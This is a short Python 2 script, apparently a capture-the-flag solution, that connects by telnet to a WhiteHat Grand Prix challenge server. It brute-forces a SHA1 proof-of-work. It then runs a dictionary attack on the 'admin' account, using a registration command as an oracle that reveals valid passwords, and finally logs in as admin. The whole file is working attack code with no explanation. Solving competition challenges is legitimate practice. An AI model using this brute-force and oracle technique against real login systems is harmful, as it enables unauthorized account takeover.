from hashlib import sha1
import telnetlib


def brute_hash(prefix, prefix_hash):
    print 'Breaking the hash... \n',
    for i in xrange(2 ** 35):
        s = str(prefix) + str(i)
        if sha1(str(s)).hexdigest()[:6] == prefix_hash:
            return s


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


HOST = "lab12b.grandprix.whitehatvn.com"
PORT = 1337
tn = telnetlib.Telnet(HOST, PORT)

data = tn.read_until("> ")
print data
pre = find_between(data, 's has prefix ', ' and ')
suf = find_between(data, 'sha1(s) has prefix ', '.')

plain_hash = brute_hash(pre, suf)
print 'Send plain hash %s' % plain_hash

tn.write(plain_hash + '\n')
print tn.read_until('\n>')
print "Breaking admin's password"
password = ''

for line in reversed(open("/usr/share/dict/words").readlines()):
    password = line.strip()
    tn.write('r admi ' + 'n' + password + '\n')
    data = tn.read_until('.')
    if "just login" in data:
        print 'Found password = ' + password
        break

tn.write('l admin ' + password + '\n')
tn.write('mm' + '\n')
print tn.read_until('==\n>')
